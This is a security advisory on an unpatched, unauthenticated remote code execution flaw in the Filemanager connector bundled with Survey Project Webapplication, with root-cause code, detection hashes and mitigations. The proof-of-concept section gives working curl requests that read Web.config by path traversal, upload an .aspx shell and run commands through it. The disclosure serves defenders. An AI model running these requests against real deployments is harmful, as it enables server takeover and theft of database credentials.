Security Advisory · SP-FM-2026-01

Survey™ Project Webapplication: unauthenticated RCE via the bundled Filemanager ASP.NET connector

The ASP.NET connector shipped with the CKEditor Filemanager plugin performs no authentication or authorization checks and takes every filesystem path from the HTTP request. An unauthenticated attacker can upload an .aspx shell, read Web.config, delete files, and rename or create paths under the application root.

Summary

Survey™ Project Webapplication bundles an old ASP.NET connector for the CKEditor “Filemanager” plugin. The handler implements a mode switch (getinfo, getfolder, rename, delete, addfolder, download, add) and passes the request parameters path, currentpath, old, new, and name straight into filesystem calls. It never checks authentication, roles, or a session.

Consequences, all reachable without credentials:

  • Upload arbitrary files with arbitrary extensions into any writable directory under the application root. IIS executes uploaded .aspx files, so this is remote code execution.
  • Read files under the application root, including Web.config with the database connection strings in production deployments.
  • Delete files and directory trees.
  • Rename files and directories, and create directories.
  • Bypass URL authorization for XmlData and NSurveyAdmin, because the handler reads the filesystem directly rather than through the ASP.NET pipeline.

2.0, 2.1, and 1.2.3 do not contain the connector. The 2.4-Turkish release is an XML language pack only. On 2.5 the application root is denied to anonymous users, but Scripts/web.config allows everyone, so the handler remains reachable and an uploaded .aspx in Scripts, Images, Content, or fonts executes. A shell uploaded to the root of a 2.5 deployment is redirected to the login page.

Root cause

The handler (abridged) dispatches on mode with no authorization check anywhere:

case "download":
    FileInfo fi = new FileInfo(context.Server.MapPath(context.Request["path"]));
    context.Response.TransmitFile(fi.FullName);

case "delete":
    Directory.Delete(HttpContext.Current.Server.MapPath(path), true);

case "add":
    System.Web.HttpPostedFile file = context.Request.Files[0];
    string path = context.Request["currentpath"];
    file.SaveAs(context.Server.MapPath(
        Path.Combine(path, Path.GetFileName(file.FileName))));

The imgExtensions array in the file is used only by IsImage() to choose preview icons; it is never applied to uploads. Server.MapPath blocks .. from escaping above the application root for path and old, but the new and name parameters are not normalized, so values containing .. or an absolute path may move or create files outside the application root, subject to filesystem permissions (source review, not executed live).

Impact

Remote code execution as the application pool identity, disclosure of database credentials and configuration files, deletion of application files, and bypass of the application's own deny rules for XmlData and NSurveyAdmin. Uploading requires write permission for the pool identity in the target directory, which is the default in common deployments of this file-based application; the read and delete primitives need no write permission.

Proof of concept

The full script is poc_surveyproject_filemanager.py. It auto-detects both handler layouts and the ../ depth, is read-only by default, and removes the shell it uploads. Use it only against systems you own or are explicitly authorized to test.

# read-only checks: listing + Web.config
python3 poc_surveyproject_filemanager.py -u http://TARGET

# upload a shell, run a command, delete the shell
python3 poc_surveyproject_filemanager.py -u http://TARGET --exploit --cmd whoami

# 2.2 layout is detected automatically; force it if needed
python3 poc_surveyproject_filemanager.py -u http://TARGET \
  --handler /Filemanager/connectors/ashx/filemanager.ashx

Manual requests

# 2.2:      /Filemanager/connectors/ashx/filemanager.ashx
# 2.3-2.5:  /Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx

# directory listing
curl -s "http://TARGET/Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx?mode=getfolder&path=/"

# read Web.config (3 levels on 2.2, 5 levels on 2.3+)
curl -s "http://TARGET/Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx?mode=download&path=../../../../../Web.config"

# upload an .aspx shell
curl -s -F "file=@shell.aspx" "http://TARGET/Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx?mode=add&currentpath=/Scripts"

# execute
curl -s "http://TARGET/Scripts/shell.aspx?cmd=whoami"

The add branch renders the result through a multi-line TextBox, so the response is a <textarea> containing HTML-encoded JSON rather than raw JSON: a client must unescape it before parsing. The script handles both forms.

Disclosure status. The vendor was notified on 2026-09-17 at mail@w3devpro.com and did not respond. No patch is available; the project's last commit is from 2021-03-13. No CVE has been assigned yet.

Detection

Request ?mode=getfolder&path=/ on the handler paths above. A vulnerable instance returns HTTP 200 and a directory tree even without a session cookie. To check a deployment offline, hash the file:

# 2.2 / 2.3
md5sum Filemanager/connectors/ashx/filemanager.ashx
# expected: e4bff7799e21360ddffe0ed85c9d8868

# 2.4 / 2.4-DOI / 2.4-wpi / 2.5
md5sum Scripts/ckeditor/Filemanager/connectors/ashx/filemanager.ashx
# expected: 8dcb00d8e5cf4f0cd3dd6dd33ed45218

Mitigation

  • Remove the connector (Filemanager/ or Scripts/ckeditor/Filemanager/) and the Filemanager browser if it is unused.
  • Otherwise add an authorization check plus an extension and path allowlist inside ProcessRequest, and restrict every mode to a dedicated non-executable upload directory.
  • Deny anonymous access to the Filemanager path. On 2.5 this must override the <allow users="*"/> rule in Scripts/web.config.
  • Block script extensions in the upload directory with IIS request filtering.
  • Keep application-pool write access scoped to data directories, not the web root.
